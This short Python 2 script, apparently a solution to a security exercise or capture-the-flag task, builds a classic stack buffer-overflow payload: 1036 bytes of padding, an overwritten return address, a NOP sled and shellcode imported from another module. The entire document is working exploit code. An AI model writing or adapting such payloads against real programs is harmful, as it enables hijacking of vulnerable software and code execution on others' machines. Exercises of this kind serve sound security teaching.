from struct import pack
from shellcode import shellcode

print "a"*1036+pack("<I",0xbffea208)+"\x90"*536+shellcode
